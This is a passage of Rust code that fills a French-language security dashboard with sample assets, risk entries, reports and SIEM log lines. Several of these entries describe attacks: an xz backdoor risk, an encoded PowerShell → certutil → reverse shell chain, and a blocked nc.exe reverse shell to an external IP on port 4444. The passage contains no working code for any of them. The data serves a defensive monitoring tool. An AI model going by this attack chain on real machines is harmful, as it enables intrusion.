            &["dsi", "windows", "vpn"],
        ),
        (
            "192.168.1.20",
            "nas-archive-02",
            "Synology",
            "nas",
            AssetCriticality::Critical,
            AssetLifecycle::Monitored,
            58.0,
            4,
            &[22, 139, 445, 5000],
            &["stockage", "sauvegarde"],
        ),
        (
            "192.168.1.1",
            "bbox.lan",
            "Sagemcom",
            "router",
            AssetCriticality::Critical,
            AssetLifecycle::Qualified,
            31.0,
            1,
            &[53, 80, 443],
            &["réseau", "périmètre"],
        ),
        (
            "192.168.1.30",
            "hp-m479",
            "HP",
            "printer",
            AssetCriticality::Low,
            AssetLifecycle::Qualified,
            22.0,
            3,
            &[80, 515, 9100],
            &["bureautique"],
        ),
        (
            "192.168.1.42",
            "cam-entree-01",
            "Hikvision",
            "camera",
            AssetCriticality::Medium,
            AssetLifecycle::Discovered,
            66.0,
            5,
            &[80, 554],
            &["iot", "sûreté"],
        ),
        (
            "192.168.1.77",
            "kali-audit",
            "Intel",
            "laptop",
            AssetCriticality::High,
            AssetLifecycle::Unauthorized,
            88.0,
            0,
            &[22],
            &["audit", "shadow-it"],
        ),
        (
            "192.168.1.150",
            "raspberrypi",
            "Raspberry Pi",
            "iot",
            AssetCriticality::Low,
            AssetLifecycle::Discovered,
            40.0,
            2,
            &[22, 1883],
            &["iot", "domotique"],
        ),
        (
            "192.168.1.9",
            "srv-ad-01",
            "HPE",
            "server",
            AssetCriticality::Critical,
            AssetLifecycle::Decommissioned,
            12.0,
            0,
            &[],
            &["ad", "retiré"],
        ),
    ];
    state.assets.assets = assets
        .iter()
        .enumerate()
        .map(
            |(i, (ip, host, vendor, kind, crit, life, risk, vulns, ports, tags))| ManagedAsset {
                id: id(300 + i as u128),
                ip: ip.to_string(),
                hostname: Some(host.to_string()),
                mac: Some(format!("3C:7C:3F:{:02X}:{:02X}:{:02X}", i, i * 7, i * 13)),
                vendor: Some(vendor.to_string()),
                device_type: kind.to_string(),
                criticality: *crit,
                lifecycle: *life,
                tags: tags.iter().map(|s| s.to_string()).collect(),
                risk_score: *risk,
                vulnerability_count: *vulns,
                open_ports: ports.to_vec(),
                software: vec![],
                first_seen: days_ago(200 - i as i64 * 20),
                last_seen: ago(i as i64 * 15),
            },
        )
        .collect();

    // ── Risks ─────────────────────────────────────────────────────────
    let risks: &[(
        &str,
        &str,
        u8,
        u8,
        &str,
        RiskStatus,
        &str,
        &str,
        Option<u32>,
    )] = &[
        (
            "Exploitation de CVE-2024-3094 (xz)",
            "Porte dérobée dans liblzma sur le poste ; sshd exposé sur le LAN.",
            4,
            5,
            "RSSI",
            RiskStatus::Open,
            "Mise à jour xz-utils, rotation des clés SSH, revue des connexions.",
            "Scan CVE",
            Some(7),
        ),
        (
            "Compromission par PowerShell encodé",
            "Chaîne PowerShell → certutil → reverse shell observée.",
            5,
            5,
            "SOC",
            RiskStatus::Mitigating,
            "Isolation réseau, analyse forensique, réinstallation.",
            "EDR",
            Some(1),
        ),
        (
            "Correctifs critiques en retard",
            "3 KB critiques non appliqués depuis 18 jours.",
            3,
            4,
            "DSI",
            RiskStatus::Mitigating,
            "Fenêtre de maintenance planifiée jeudi.",
            "Conformité",
            Some(14),
        ),
        (
            "Sauvegarde non vérifiable",
            "L'agent de sauvegarde ne répond plus ; dernière sauvegarde validée J-2.",
            2,
            5,
            "DSI",
            RiskStatus::Open,
            "Diagnostic de l'agent, test de restauration.",
            "Conformité",
            Some(3),
        ),
        (
            "Équipement non autorisé sur le LAN",
            "kali-audit (192.168.1.77) a balayé les ports du poste.",
            3,
            3,
            "RSSI",
            RiskStatus::Accepted,
            "Audit interne déclaré, plage validée jusqu'au 30/09.",
            "Découverte",
            None,
        ),
        (
            "Second serveur DHCP",
            "Box de secours répond aux requêtes DHCP.",
            1,
            2,
            "Réseau",
            RiskStatus::Closed,
            "Box reconfigurée en mode bridge.",
            "Réseau",
            None,
        ),
    ];
    state.risks.entries = risks
        .iter()
        .enumerate()
        .map(
            |(i, (title, desc, p, imp, owner, status, mit, src, sla))| RiskEntry {
                id: id(400 + i as u128),
                title: title.to_string(),
                description: desc.to_string(),
                probability: *p,
                impact: *imp,
                owner: owner.to_string(),
                status: *status,
                mitigation: mit.to_string(),
                source: src.to_string(),
                created_at: days_ago(20 - i as i64 * 3),
                updated_at: ago(60 * (i as i64 + 1)),
                sla_target_days: *sla,
            },
        )
        .collect();

    // ── Reports ───────────────────────────────────────────────────────
    for (i, (kind, title, summary, score, fw, mins)) in [
        (ReportType::Executive, "Synthèse exécutive — septembre 2026", "Score de conformité 87,4 % (+4,3 pts). 2 vulnérabilités critiques, 1 incident EDR en cours de remédiation.", Some(87.4f32), None, 45i64),
        (ReportType::ComplianceAudit, "Audit de conformité NIS2 — Q3 2026", "17 contrôles conformes sur 21. Écarts : pare-feu profil public, correctifs, verrouillage de session, sauvegarde.", Some(81.0), Some("NIS2"), 1_500),
        (ReportType::Incident, "Incident #2026-0912 — compromission initiale PC-DSI-114", "Chaîne PowerShell encodé → certutil → reverse shell. Poste isolé à 14:07, IOC transmis au SIEM.", None, None, 26),
    ]
    .iter()
    .enumerate()
    {
        state.reports.reports.push_back(GeneratedReport {
            id: id(500 + i as u128),
            report_type: *kind,
            title: title.to_string(),
            generated_at: ago(*mins),
            html_content: format!("<h1>{title}</h1><p>{summary}</p>"),
            summary: summary.to_string(),
            compliance_score: *score,
            framework: fw.map(|s| s.to_string()),
        });
    }

    // ── SIEM ──────────────────────────────────────────────────────────
    let siem: &[(
        SiemLogSeverity,
        SiemLogSource,
        &str,
        &str,
        &str,
        Option<u32>,
        &str,
    )] = &[
        (
            SiemLogSeverity::Critical,
            SiemLogSource::System,
            "edr",
            "Reverse shell nc.exe → 185.220.101.4:4444 bloqué",
            "nc.exe",
            Some(5203),
            "svc-print",
        ),
        (
            SiemLogSeverity::Error,
            SiemLogSource::Auth,
            "auth",
            "Échec d'authentification ×7 pour « administrateur » depuis 192.168.1.77",
            "sshd",
            Some(1188),
            "administrateur",
        ),
        (
            SiemLogSeverity::Warning,
            SiemLogSource::Firewall,
            "firewall",
            "Sortie TCP 9001 vers 185.220.101.4 autorisée (profil Public inactif)",
            "mpssvc",
            Some(2044),
            "SYSTEM",
        ),
        (
            SiemLogSeverity::Warning,
            SiemLogSource::System,
            "fim",
            "/etc/sudoers modifié",
            "sentinel-fim",
            Some(3301),
            "root",
        ),
        (
            SiemLogSeverity::Notice,
            SiemLogSource::Application,
            "update",
            "Mise à jour 4.1.0 disponible",
            "sentinel-agent",
            Some(3299),
            "SYSTEM",
        ),
        (
            SiemLogSeverity::Info,
            SiemLogSource::Auth,
            "auth",
            "Session ouverte pour thibault.llopis (console)",
            "login",
            Some(1201),
            "thibault.llopis",
        ),
        (
            SiemLogSeverity::Info,
            SiemLogSource::System,
            "scan",
            "Analyse de conformité terminée : 87,4 %",
            "sentinel-scanner",
            Some(3300),
            "SYSTEM",
        ),
        (
            SiemLogSeverity::Info,
            SiemLogSource::Application,
            "sync",
            "148 actifs synchronisés",
            "sentinel-sync",
            Some(3302),
            "SYSTEM",
        ),
    ];
    for (i, (sev, src, cat, msg, proc_, pid, user)) in siem.iter().enumerate() {
        state.siem.log_entries.push_back(GuiSiemLogEntry {
            id: format!("evt-{:06}", 48_210 - i),
            timestamp: ago(i as i64 * 4 + 1),
            severity: *sev,
            source: *src,
            category: cat.to_string(),
            message: msg.to_string(),
            hostname: Some("PC-DSI-114".into()),
            process: Some(proc_.to_string()),
            pid: *pid,
            user: Some(user.to_string()),
        });
    }
    state.siem.stats = GuiSiemStats {
        events_sent: 48_210,
        events_dropped: 12,
        events_buffered: 37,
        connected: true,
        last_sent_at: Some(ago(1)),
        uptime_secs: state.summary.uptime_secs,
        events_per_minute: 42.5,
        category_counts: vec![
            ("auth".into(), 18_402),
            ("firewall".into(), 12_880),
            ("system".into(), 9_311),
            ("application".into(), 5_120),
            ("edr".into(), 1_830),
            ("fim".into(), 667),
        ],
    };

    // ── KPI trend (30 days) ───────────────────────────────────────────
    for d in (0..30).rev() {
        let progress = (30 - d) as f32 / 30.0;
        state.kpi.snapshots.push_back(KpiSnapshot {
            timestamp: days_ago(d),
            compliance_score: 79.0 + 8.4 * progress + rng.range(-1.2, 1.2) as f32,
            incident_count: (3.0 - 2.0 * progress + rng.range(0.0, 1.5) as f32) as u32,
            open_vulns: (34.0 - 12.0 * progress + rng.range(0.0, 3.0) as f32) as u32,
            closed_vulns: (5.0 + 20.0 * progress) as u32,
            remediation_sla_pct: 62.0 + 30.0 * progress + rng.range(-2.0, 2.0) as f32,
        });
    }
    // The trend ends where the summary card is, or the two numbers argue.
    if let Some(last) = state.kpi.snapshots.back_mut() {
        last.compliance_score = 87.4;
    }
}

/// Open the drawer named by `PREVIEW_DRAWER` on the first matching record.
pub fn open_drawer(state: &mut AppState, which: &str) {
    match which {
        "vuln" => {
            state.vulnerability.selected_vuln = Some(0);
            state.vulnerability.detail_open = true;
        }
        "threat" => {
            state.threats.selected_threat = Some(0);
            state.threats.detail_open = true;
        }
        "asset" => {
            state.assets.selected_asset = Some(0);
            state.assets.detail_open = true;
        }
        "package" => {
            state.software.selected_package = Some(0);
            state.software.detail_open = true;
        }
        "connection" => {
            state.network.selected_connection = Some(5);
            state.network.detail_open = true;
        }
        "risk" => {
            state.risks.selected_risk = Some(0);
            state.risks.detail_open = true;
        }
        "fim" => {
            state.fim.selected_alert = Some(0);
            state.fim.detail_open = true;
        }
        "notification" => {
            state.selected_notification = Some(0);
            state.notification_detail_open = true;
        }
        "log" => {
            state.terminal.selected_log = Some(0);
            state.terminal.detail_open = true;
            state.siem.selected_log = Some(0);
            state.siem.detail_open = true;
        }
        _ => {}
    }
}
